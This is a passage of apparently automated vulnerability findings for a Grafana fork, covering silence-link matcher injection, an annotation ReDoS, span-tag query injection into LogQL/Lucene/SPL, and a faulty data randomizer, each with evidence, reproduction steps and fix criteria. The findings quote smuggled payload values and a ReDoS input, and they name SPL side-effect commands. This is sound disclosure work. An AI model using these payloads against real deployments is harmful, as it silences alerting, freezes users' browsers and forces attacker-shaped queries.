   The 'Silence' button on the Alert groups page (/alerting/groups, data from GET /api/alertmanager/<uid>/api/v2/alerts/groups via alertmanagerApi.ts:161) calls makeLabelBasedSilenceLink(alertManagerSourceName, alert.labels) with the Alertmanager's label set verbatim. `__alert_rule_uid__` is a private label and is filtered out, so nothing re-scopes the resulting silence to the clicked rule. Object.entries preserves the JSON key order; the Go server marshals the label map with sorted keys (assumption: encoding/json map ordering), so a label named e.g. `a` precedes `alertname`.
5. [public/app/features/alerting/unified/notifications/NotificationDetailActions.tsx:75–81](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/notifications/NotificationDetailActions.tsx#L75-L81)
   The notification-history 'Silence notifications' menu item builds the same unquoted link from notification.groupLabels without a rule-UID matcher; the triage drawer (InstanceDetailsDrawerTitle.tsx:93-95) is the only caller that appends `__alert_rule_uid__` and is therefore blunted.
6. [public/app/features/alerting/unified/NewSilencePage.tsx:17–26](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/NewSilencePage.tsx#L17-L26)
   The new-silence page parses the `matcher` parameters with parseQueryParamMatchers and seeds the form via defaultsFromQuery; ruleUid is only set when a `__alert_rule_uid__` matcher is present, which the Alert groups and notification-history links never carry.
7. [public/app/features/alerting/unified/components/silences/utils.ts:13–31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/silences/utils.ts#L13-L31)
   defaultsFromQuery turns the parsed matchers directly into the silence form's default matcher rows via matcherToMatcherField, with no re-validation against the originating alert.
8. [public/app/features/alerting/unified/components/silences/SilencesEditor.tsx:166–190](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/silences/SilencesEditor.tsx#L166-L190)
   On submit, matchers with an empty value are dropped (line 173: `.filter((field) => field.name && field.value)`), so the decoy `a=""` matcher that referenced the attacker's own label disappears and the silence is created with only the injected regex matchers (`alertname=~".+"`, `grafana_folder=~".+"`), matching every alert in the Grafana Alertmanager.

## Impact
The victim unknowingly creates a silence matching every alert in the Grafana Alertmanager, suppressing all notifications for the organisation until it is discovered and expired. No data is disclosed and the service stays available; the change is visible in the silences list and reversible, so integrity is LOW rather than HIGH.

## Reproduction steps
1. The attacker needs an alert with a crafted label value to reach the Grafana Alertmanager: a datasource (or data written into it) returning a series with a label such as `a=",alertname=~.+,grafana_folder=~.+"` for an evaluated rule, or a folder-scoped rule author setting such a rule label. No Grafana privileges are needed for the datasource path. A Grafana user with silence-create permission must then open Alert groups (or the notification detail menu), click 'Silence' on that alert and submit the pre-filled form (UI:Active). The dependency on controlling alert labels is the attack requirement.

## Recommended fix
getMatcherQueryParams serialises label key/value pairs into matcher syntax by concatenation without quoting, so label values can introduce additional matchers and operators; the consumer then trusts the parsed result as the alert's identity. Fix criteria: Silence links must encode each label as a single matcher regardless of the characters in the value (e.g. quote/escape the value as labelsToMatchersParam does), and the new-silence page must reconstruct exactly one equality matcher per original label. Verify that an alert label value containing `,`, `=~`, `"` or `!=` yields a pre-filled silence that matches only alerts carrying that literal label value.

---
**Severity:** LOW
**Status:** Open
**Category:** Injection
**CWE:** [CWE-116](https://cwe.mitre.org/data/definitions/116.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256267

---

# Quadratic lazy-regex scan of alert annotation text in Tokenize hangs rule and alert views

## Details
`Tokenize` (components/Tokenize.tsx:29-35) highlights `{{ ... }}` template tokens in alert annotation text. It compiles `(?<before>.*?)({{(?<token>.*?)}}|$)` with the `g` and `m` flags and iterates `line.matchAll(regex)` for every `\n`-split line of the input. Both capture groups are lazy `.*?` and the second alternative is `$`, so on a line that contains `{{` openers but no `}}` the engine, for each candidate length of `<before>` ending at an opener, extends `<token>` one character at a time to the end of the line before backtracking. A single line of N `{` characters (an opener at every offset) therefore costs about N^2/2 character steps before `$` finally matches at offset N: roughly 5x10^9 steps for a 100 KB annotation and 5x10^11 for 1 MB, blocking the browser main thread for seconds to many minutes. No length limit is applied before tokenizing and the delimiter is the constant `['{{','}}']` at every call site. (Assumption, shared with the verified record template-parser-quadratic-regex-dos: V8/irregexp and YARR backtracking semantics with no required-literal pre-check for a lazy loop followed by an alternation containing `$`, and V8's non-backtracking fallback engine off, which is the default in shipped Chromium/Firefox.)

Who controls the input. The annotation text is datasource-returned data (threat-model adversary 4) that Grafana's frontend never validates or truncates:
- Rule view page (primary, default UI): `/alerting/:sourceName/:id/view` (routes.tsx:362-366) renders `Details` in the sidebar on every rule page (RuleViewer.tsx:191). `Details` takes `getAnnotations(rule.promRule)` (Details.tsx:79, utils/rules.ts:236) - the `annotations` object of the rule as returned by `GET /api/prometheus/<dsUid>/api/v1/rules` of a Prometheus/Loki/Mimir datasource (alertRuleApi.ts:196-203; `groupRulesByFileName` only regroups) - and `AnnotationValue` (Details.tsx:252-265) passes every value not starting with `http` to `Tokenize`. `DetailGroup`/`DetailText` render eagerly, so simply opening the rule's page runs the scan.
- Expanded rule rows: `RulesTable` (RulesTable.tsx:95) -> `RuleDetails` -> `RuleDetailsAnnotations` -> `AnnotationDetailsField` tokenizes all annotations of the expanded rule in the dashboard panel Alert tab (PanelAlertTabContent.tsx:66), the alert-rules drawer (AlertRulesDrawerContent.tsx:23) and the v1 grouped list (RulesGroup.tsx:234). In the v1 grouped list `RulesTable showSummaryColumn` additionally tokenizes `annotations.summary` of every rule as soon as the group expands (RulesTable.tsx:247-256); that list is non-default since `alertingListViewV2` is documented as enabled by default.
- Alert instances: `AlertInstancesTable` (line 94) -> `AlertInstanceDetails` -> `AnnotationDetailsField` tokenizes the per-instance annotations the datasource returns in its `alerts` array.
- Alert groups page (`/alerting/groups` with an external Alertmanager datasource selected): `AlertGroupAlertsTable` (line 79-81) -> `AlertDetails` (line 66-68) -> `AnnotationDetailsField` tokenizes annotations of `AlertmanagerAlert` objects fetched from `/api/alertmanager/<dsUid>/api/v2/alerts/groups`.

Prometheus-compatible rulers and Alertmanagers impose no length limit on annotation values, and Grafana's proxy is configured with `response_limit = 0` (conf/defaults.ini:370; the Go proxy is not in this checkout and is assumed to pass the JSON through). A compromised or malicious datasource, or an attacker on the network path to it, can therefore return a single rule or alert whose `summary`/`description` annotation is a few hundred KB of `{` on one line and deterministically freeze the tab of every Grafana user who opens that rule's page, expands the rule or its instances, or views the alert group. A Grafana Editor could store the same payload in a Grafana-managed rule's annotation through the ruler API (Editor -> Viewer), subject to any server-side limit the backend applies (not verifiable here); the primary attacker position is the datasource response, which needs no Grafana privileges.

Impact is availability of the victim's browser tab only (no data disclosure or modification; the server is unaffected; the user recovers by closing the tab, but the rule page stays unusable while the datasource serves the payload). It is filed because the trigger is datasource-returned data - the threat model's stated exception to the browser-DoS exclusion - and because the cost is set by the input's shape, not its volume. It is the same weakness class as the verified record template-parser-quadratic-regex-dos at a different, more widely rendered sink: annotations appear on the default rule view page rather than only inside a contact-point editor.

## Evidence
1. [public/app/features/alerting/unified/components/Tokenize.tsx:29–35](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/Tokenize.tsx#L29-L35)
   Tokenize compiles /(?<before>.*?)({{(?<token>.*?)}}|$)/gm and runs line.matchAll(regex) over each '\n'-split line of the annotation. For a line of N '{' characters (an opener '{{' at every offset, no '}}'), every lazy extension of <before> lands on an opener, and the lazy <token> group then scans to end-of-line before '}}' fails and '$' fails at that offset; only at offset N does '$' succeed. Total work is about N^2/2 character steps for the first match - quadratic in the input - and nothing bounds the input length. The delimiter is always the constant ['{{','}}'] at every call site.
2. [public/app/features/alerting/unified/components/rule-viewer/Details.tsx:228–265](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rule-viewer/Details.tsx#L228-L265)
   The sidebar Details component maps every annotation (lines 228-241) to <DetailText value={<AnnotationValue value={value}/>}>, and AnnotationValue (252-265) passes every value not starting with 'http' to <Tokenize>. DetailGroup (line 36) and DetailText render children eagerly - no collapse or truncation. The annotations are line 79's getAnnotations(rule.promRule): the 'annotations' object of the rule as returned by the datasource's Prometheus rules API.
3. [public/app/features/alerting/unified/components/rule-viewer/RuleViewer.tsx:190–192](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rule-viewer/RuleViewer.tsx#L190-L192)
   The rule view page unconditionally renders <Details rule={rule}/> in the sidebar for Grafana-managed and data-source-managed rules alike. The route is /alerting/:sourceName/:id/view (routes.tsx:362-366, roles AlertingRuleRead | AlertingRuleExternalRead); RuleViewer.tsx:42 loads the rule via useCombinedRule, which for a datasource rule reads promRule from alertRuleApi.prometheusRuleNamespaces (useCombinedRule.ts:115-130). Simply opening the rule's page renders the payload.
4. [public/app/features/alerting/unified/api/alertRuleApi.ts:196–202](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/api/alertRuleApi.ts#L196-L202)
   prometheusRuleNamespaces fetches api/prometheus/<dsUid>/api/v1/rules - the Grafana backend's proxy of the Prometheus/Loki/Mimir datasource's rules API - and transformResponse only regroups response.data.groups by file name (api/prometheus.ts:111-125, normalizeRuleGroup); annotation strings are passed through unmodified. conf/defaults.ini:370 response_limit = 0 places no size bound on proxied responses.
5. [public/app/features/alerting/unified/components/AnnotationDetailsField.tsx:37–65](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/AnnotationDetailsField.tsx#L37-L65)
   AnnotationValue here routes every annotation without a valueLink and not starting with 'http' through <Tokenize> (line 43, rendered at 54 or 65). Callers: rules/RuleDetailsAnnotations.tsx:23-27 (expanded row of RulesTable via RuleDetails.tsx:54, reached from RulesTable.tsx:95 in PanelAlertTabContent.tsx:66, AlertRulesDrawerContent.tsx:23 and RulesGroup.tsx:234), rules/AlertInstanceDetails.tsx:23-27 (expanded row of AlertInstancesTable.tsx:94, per-instance annotations from the datasource's 'alerts' array; useCleanAnnotations only drops empty values), and alert-groups/AlertDetails.tsx:66-68 (expanded row of AlertGroupAlertsTable.tsx:79-81, annotations of AlertmanagerAlert objects from /api/alertmanager/<dsUid>/api/v2/alerts/groups, alertmanagerApi.ts:161).
6. [public/app/features/alerting/unified/components/rules/RulesTable.tsx:247–255](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rules/RulesTable.tsx#L247-L255)
   With showSummaryColumn the table renders <Tokenize input={rule.annotations[summary]}/> for every rule row of an expanded group without any click on the row. Only RulesGroup.tsx:234-240 sets showSummaryColumn={true} (used by rules/CloudRules.tsx:88-95 in the v1 grouped list). This list-page sink is secondary: docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md:45 lists alertingListViewV2 as enabled by default, so the v1 list is reached only through the preview toggle (featureToggles.ts:10-19) or when the operator disables the toggle. The rule view page, panel alert tab, alert instances and alert groups paths do not depend on the list version.
7. [public/app/features/alerting/unified/utils/rules.ts:236–238](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/rules.ts#L236-L238)
   getAnnotations returns rule.annotations from the Prometheus API rule object unmodified; there is no size or content validation anywhere between the datasource response and the Tokenize call.

## Impact
The victim's browser tab becomes unresponsive for the duration of the quadratic scan (seconds to minutes depending on annotation size); nothing is disclosed or modified and the server is unaffected. Recovery is closing the tab, but the rule page stays unusable for as long as the datasource serves the payload.

## Reproduction steps
1. Attacker: a compromised or malicious Prometheus/Loki/Mimir rules datasource or external Alertmanager datasource (or a machine-in-the-middle on Grafana's path to it) - threat-model adversary 4, holding no Grafana privileges (PR:N). Precondition: such a datasource must be configured in Grafana (AT:P). Delivery: return one rule (or alert) whose annotation value is a single line of ~100 KB-1 MB of '{' characters with no '}}'. Trigger: a victim with rule-read access opens that rule's view page (/alerting/<ds>/<id>/view), whose sidebar Details renders every annotation through Tokenize on mount - visiting a page suffices (UI:P); expanding the rule row, an alert instance or an alert group reaches the same sink. Deterministic; no defence to bypass (AC:L). Assumes the backend proxy passes annotation strings through unmodified (response_limit = 0 by default; Go source not in checkout) and standard backtracking regex engines in shipped browsers.

## Recommended fix
Tokenize.tsx:29-35 tokenizes untrusted annotation text with a backtracking regex whose two lazy '.*?' groups and '|$' alternative make the match cost quadratic in the number of unmatched '{{' openers, and applies it with no size bound. Fix criteria: Tokenizing an annotation of N characters must take time linear in N regardless of content - e.g. a single-pass indexOf-based scanner for the delimiters, or a pattern whose token body cannot re-scan past another opener (such as [^{}]*) - and/or annotation text must be truncated to a fixed bound before tokenizing. Verify that a 1 MB single-line string of repeated '{{' renders in the rule viewer Details, RulesTable summary column, AlertInstanceDetails and alert-groups AlertDetails without blocking the main thread for more than a few milliseconds.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256264

---

# Span tag values spliced unescaped into trace-to-logs/metrics/profiles queries run against other datasources

## Details
The trace-to-logs, trace-to-metrics and trace-to-profiles features build a query for a second datasource out of the span the user is viewing. `getFormattedTags` (createSpanLink.tsx:643-667) concatenates each mapped span/process tag value between literal double quotes (`cluster="<value>"`, `cluster:"<value>"`, `cluster:="<value>"`), and the result is substituted for `${__tags}` by templateSrv (string scoped vars go through the glob format, which returns them unchanged) into the LogQL `{${__tags}}`, Lucene, SPL, LogScale, Google Cloud Logging and LogsQL templates; the default PromQL template embeds `span.process.serviceName` raw; SpanFlameGraph puts the same string into the Pyroscope label selector. There is no escaping for `"`, backslash, `}`, `#` or language operators anywhere between the datasource frame (utils/transform.ts: `serviceTags`/`tags` columns) and the query text.

Tag values are authored by the tracing datasource or the network path to it (threat-model adversary 4). For Loki, a `service.name` attribute of `x"} |= "secret" | logfmt #` makes the generated expression `{service_name="x"} |= "secret" | logfmt # "}`: the injected `#` comments out the template's trailing `"}` (LogQL supports `#` line comments), so arbitrary selectors, line filters and pipeline stages run. For Elasticsearch/OpenSearch a value such as `x" OR *:* OR "` rewrites the Lucene query_string; for Splunk the SPL search string can gain pipe stages. The query is executed by the victim's browser against the logs/metrics/profiles datasource — a system the attacker does not control — with the victim's Grafana permissions and that datasource's server-side credentials: on click of the 'Related logs' / metrics / profiles buttons (splitOpenFn opens a split Explore pane and runQueries runs it immediately), and automatically, with no click, for profiles (SpanFlameGraph's effect queries Pyroscope as soon as a span carrying `pyroscope.profile.id` is expanded, when trace-to-profiles is configured).

What the project concedes to the tracing backend is label-value control (`service_name="<value>"`, per docs/sources/datasources/tempo/configure-tempo-data-source/configure-trace-to-logs.md); this defect hands it structural control of the query. Impact is a forced, attacker-shaped read query on another datasource and attacker-selected content in the victim's 'related logs/profiles' view, defeating the trace→logs correlation the UI promises. For read-only query languages (LogQL, PromQL, Lucene, LogsQL) the attacker does not see results and cannot change state, so the direct impact is low integrity. For SPL (grafana-splunk-datasource, an Enterprise plugin not in this checkout) search-time commands such as `| sendemail`, `| outputlookup` or `| collect` have side effects that would let the injection write or exfiltrate with the Splunk credentials stored on the datasource; this is an unverified possibility and does not raise the rating.

Dependency assumptions: the bundled Loki/Prometheus/Elasticsearch/Pyroscope plugins (data/plugins-bundled, source maps only) forward `expr`/`query`/`labelSelector` to the backend as query text, as their Explore query editors do; mapInternalLinkToExplore (recovered from public/build/6540.*.js.map, packages/grafana-data/src/utils/dataLinks.ts) interpolates every string field of the query with replaceVariables and passes the result to onClickFn. Requirement: the tracing datasource must have trace-to-logs/metrics/profiles configured with a target datasource (non-default jsonData). The custom-query path is affected identically since `${__tags}` and `${__span.tags.*}` are interpolated the same way.

## Evidence
1. [public/app/features/explore/TraceView/createSpanLink.tsx:643–667](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/createSpanLink.tsx#L643-L667)
   getFormattedTags iterates span.process.tags, span.tags, spanId/traceId/operationName/duration and, for every key the operator mapped, emits `<label><sign>"<tag.value>"` (line 661) joined by the per-datasource separator. tag.value is inserted verbatim: no escaping of `"`, backslash, `}`, `|`, `#`, newlines or language operators, so a value can close the matcher and append arbitrary LogQL/Lucene/SPL/LogsQL/LQL/Cloud-Logging text. This is the line the fix must change.
2. [public/app/features/explore/TraceView/createSpanLink.tsx:180–291](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/createSpanLink.tsx#L180-L291)
   Logs link: the tags string becomes the `__tags` scoped variable (241-245) and is interpolated by templateSrv.replace through mapInternalLinkToExplore (250-258) into the datasource template built at 430-637 (`{${__tags}}` for Loki, `${__tags}` joined with AND/OR for Elasticsearch/OpenSearch, Splunk, LogScale, Google Cloud Logging, VictoriaLogs). formatVariableValue falls back to the glob format for a string scoped var, which returns the string unchanged, so the raw tag value reaches the final query text; the same object is used for href, onClick (splitOpenFn) and interpolatedParams.
3. [public/app/features/explore/TraceView/createSpanLink.tsx:295–331](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/createSpanLink.tsx#L295-L331)
   Metrics link: the default PromQL template embeds `span.process.serviceName` raw inside `service="..."` (299) before templating, and `__tags` (318-324) is again built with getFormattedTags for operator-configured `${__tags}` templates.
4. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/SpanFlameGraph.tsx:103–171](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/SpanFlameGraph.tsx#L103-L171)
   Profiles: labelSelector is `{${getFormattedTags(span, tags)}}` (116) or a custom template interpolated with span-tag scoped vars (105-110); the useEffect at 155-171 calls queryFlameGraph -> getDataSourceInstance(uid).query() as soon as the span detail renders for a span carrying `pyroscope.profile.id`. No click is required and no feature toggle gates it.
5. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/SpanDetailLinkButtons.tsx:98–131](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/SpanDetailLinkButtons.tsx#L98-L131)
   The links are surfaced as the 'Related logs' / 'Profiles for this span' / metrics buttons; their onClick is mapInternalLinkToExplore's handler, which calls splitOpenFn with the interpolated query, and explore/state/main.ts splitOpen -> createNewSplitOpenPane dispatches runQueries, executing the injected query against the second datasource with the viewer's permissions.
6. [public/app/features/explore/TraceView/utils/transform.ts:22–35](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/utils/transform.ts#L22-L35)
   Source of the untrusted values: span.process.tags are taken verbatim from the `serviceTags` column and span.tags from the `tags` column of the trace datasource's response frame; nothing between the datasource and getFormattedTags normalises or escapes them.
7. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/LogsLink.tsx:92–153](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/LogsLink.tsx#L92-L153)
   Variant only: when the public-preview toggle `grafana.dynamicTraceToLogs` (not enabled by default) is on, useHasLogs runs linkModel.interpolatedParams.query through getDataSourceInstance(query.datasource).query() on span-detail mount, making the logs injection zero-click. The rating does not rest on this non-default path.

## Impact
The victim's browser executes an attacker-shaped query against a second datasource with the victim's permissions and that datasource's credentials, and the correlated logs/profiles view shows attacker-selected data. For the bundled read-only query languages the attacker receives no results and changes no state, so confidentiality is unaffected and integrity impact is limited to the forced request and a misleading correlation view; the Splunk SPL side-effect path is unverifiable here and is not rated.

## Reproduction steps
1. Attacker controls the tracing backend or the path to it and returns a span whose mapped tag (e.g. service.name) contains quote, operator and `#` characters. A viewer opens the trace in Explore or a traces panel and expands the span; the injected query runs when they click 'Related logs'/metrics, or with no click for the flame graph when trace-to-profiles is configured and the span carries pyroscope.profile.id. Requires trace-to-logs/metrics/profiles to be configured against a second datasource (non-default jsonData), hence AT:P; no Grafana privileges are needed by the attacker.

## Recommended fix
1. getFormattedTags (and the default PromQL/Pyroscope templates) interpolate untrusted span tag values into query text by string concatenation inside quotes with no language-aware escaping. Fix criteria: Tag values must be escaped for the target query language before being placed inside the quoted matcher (at minimum backslash, double quote and newline for LogQL/PromQL/LogsQL; the Lucene/SPL/LogScale/Cloud Logging special characters for those backends), or passed via parameterised query fields where the datasource supports it. Verify that a span tag value of `x"} |= "secret" | logfmt #` yields a query whose matcher equals literally that string and nothing else.
2. Interpolated queries derived from span data are executed automatically (SpanFlameGraph effect; useHasLogs under grafana.dynamicTraceToLogs) without the user seeing or confirming them. Fix criteria: Queries auto-executed from span content must only be built from escaped values (above) and bounded to the intended matcher shape; verify no automatic datasource request is issued whose query text differs from the templated form when a span contains injection characters.

---
**Severity:** LOW
**Status:** Open
**Category:** Query injection
**CWE:** [CWE-943](https://cwe.mitre.org/data/definitions/943.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256258

---

# Support-snapshot 'Randomize data' leaves every uppercase letter unchanged due to inverted case test

## Details
The panel 'Get help' wizard (PanelInspectDrawer -> HelpWizard -> SupportSnapshotService) builds a support snapshot containing the panel's raw query results and offers three 'Randomize data' switches (Labels, Field names, String values) described as 'Modify the original data to hide sensitive information'. The randomisation is implemented by newLetterRandomizer() in randomizer.ts, which is meant to replace every lowercase letter with a random lowercase letter and every uppercase letter with a random uppercase letter.

The second branch of the per-character mapper is wrong: it tests `c !== c.toUpperCase()` (the same predicate as the first branch) instead of `c !== c.toLowerCase()`. For an uppercase letter both predicates are false, so the function falls through to `return c`. As a result every uppercase letter of every label value, field name and string field value is copied unchanged into the 'randomised' snapshot, in its original position, with the original string length. Digits and punctuation are also preserved by design, so for typical operational data (hostnames such as PROD-DB-01, region codes like US-EAST-1, customer or product codes, email domains, log lines containing acronyms, IP addresses) the 'anonymised' output discloses most or all of the original information; only lowercase letters are scrambled.

The output is explicitly intended for disclosure: SupportSnapshotService offers a 'Download' of the debug dashboard JSON and a 'Copy a complete GitHub comment to the clipboard' template (getGithubMarkdown) for pasting into public GitHub issues or sending to Grafana Labs support. A user who enables the randomisation switches is given no indication that uppercase characters survive, so the privacy control fails silently and sensitive datasource content is exposed to whoever receives the snapshot.

This is a defect in a security/privacy feature (CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer). It needs no attacker input; the 'adversary' is any recipient of a snapshot the user believed to be anonymised. The same randomizer is also imported by the legacy public/app/features/dashboard/components/HelpWizard/utils.ts, so both help-wizard implementations are affected.

## Evidence
1. [public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.ts:16–22](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.ts#L16-L22)
   Per-character mapper of newLetterRandomizer. Line 16 `c.toLowerCase() && c !== c.toUpperCase()` is true only for lowercase letters. Line 19 repeats the same predicate `c !== c.toUpperCase()` instead of `c !== c.toLowerCase()`, so for an uppercase letter both tests are false and line 22 returns the character verbatim. The `upper` alphabet declared at line 4 is therefore never used: every uppercase letter survives randomisation in its original position.
2. [public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.ts:36–76](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.ts#L36-L76)
   randomizeData applies the defective randomizer to field label values (opts.labels), field names (opts.names) and every value of string-typed fields (opts.values) of the panel's DataFrameJSON result set. Digits and punctuation are kept by design (see the 'should keep numbers' test); uppercase letters are kept only because of the bug.
3. [public/app/features/dashboard-scene/inspect/HelpWizard/utils.ts:89–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/HelpWizard/utils.ts#L89-L133)
   getDebugDashboard takes the query runner's live result (line 89), passes it through randomizeData (line 92) and embeds the frames as a grafana snapshot query in the debug dashboard JSON (lines 118-131). SupportSnapshotService stringifies this for the Download button and wraps it in getGithubMarkdown (lines 44-61) as a ready-to-paste GitHub comment, i.e. the output is intended for third parties.
4. [public/app/features/dashboard-scene/inspect/HelpWizard/HelpWizard.tsx:151–180](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/HelpWizard/HelpWizard.tsx#L151-L180)
   The 'Randomize data' field is described as 'Modify the original data to hide sensitive information. Note the lengths will stay the same, and duplicate values will be equal.' The stated caveats are length and duplicate preservation only; nothing tells the user that uppercase letters (or digits) are emitted unchanged, so the control fails silently.
5. [public/app/features/dashboard/components/HelpWizard/utils.ts:78](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/HelpWizard/utils.ts#L78)
   The legacy (non-scenes) HelpWizard imports the same randomizeData from dashboard-scene/inspect/HelpWizard/randomizer (line 18) and applies it to its support snapshot at line 78, so both help-wizard implementations ship the defect.
6. [public/app/features/dashboard-scene/inspect/PanelInspectDrawer.tsx:115–117](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/PanelInspectDrawer.tsx#L115-L117)
   Entry point: the inspect drawer renders HelpWizard whenever currentTab is InspectTab.Help, reached from the panel menu 'Get help' entry (PanelMenuBehavior.tsx:263-271, shown when dashboard.canEditDashboard()) or directly via the `?inspect=<id>&inspectTab=help` URL state on any dashboard the user can view.
7. [public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.test.ts:3–19](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/inspect/HelpWizard/randomizer.test.ts#L3-L19)
   The two tests assert determinism, that '-' stays at index 5 of 'Hello-World', and that '123-' is preserved in '123-Abc'. Digit preservation is thus sanctioned by the project; no assertion checks that 'H', 'W' or 'A' change, so the uppercase defect is not caught even though the test is named 'should randomize letters'.

## Impact
Confidentiality of datasource content the user explicitly chose to redact is partially lost: all uppercase characters of labels, field names and string values are disclosed verbatim with their positions, which together with the by-design preserved digits and punctuation reconstructs hostnames, region codes, acronyms and identifiers. Disclosure is limited to one panel's result set and to the snapshot recipient, so LOW. No integrity or availability impact.

## Reproduction steps
1. No attacker input is needed; the leaked strings come from the user's own datasource. A Grafana user opens the panel's Get help wizard (panel menu, requires dashboard edit permission, or the ?inspect=&inspectTab=help URL), enables Labels / Field names / String values believing sensitive strings are scrambled, then downloads the debug dashboard or copies the provided GitHub-comment template to a support ticket or public issue. The recipient (PR:N) reads every uppercase letter, digit and punctuation mark of the original data in place. Deterministic (AC:L); depends on the user randomising and sharing (AT:P, UI:A).

## Recommended fix
1. newLetterRandomizer's uppercase branch uses the predicate `c !== c.toUpperCase()` (identical to the lowercase branch) instead of `c !== c.toLowerCase()`, so uppercase letters are never replaced and the privacy control advertised in the HelpWizard does not remove the information it claims to. Fix criteria: After the fix, every character that has a case distinction must be replaced (uppercase letters by random uppercase letters, lowercase by random lowercase) when randomisation is enabled, and the behaviour for digits/punctuation must either be randomised or be clearly stated in the UI description. Verify with a unit test that rand('Hello-World') and rand('ABC123') contain none of the original letters at any position while preserving length, '-' position and determinism.
2. The randomizer's test suite only asserts determinism and separator position, so a complete failure to scramble uppercase letters went undetected. Fix criteria: Add tests asserting that uppercase and lowercase letters are both changed and that the Labels / Field names / String values options in randomizeData produce output in which no original alphabetic character remains in place.

---
**Severity:** LOW
**Status:** Open
**Category:** Sensitive information exposure
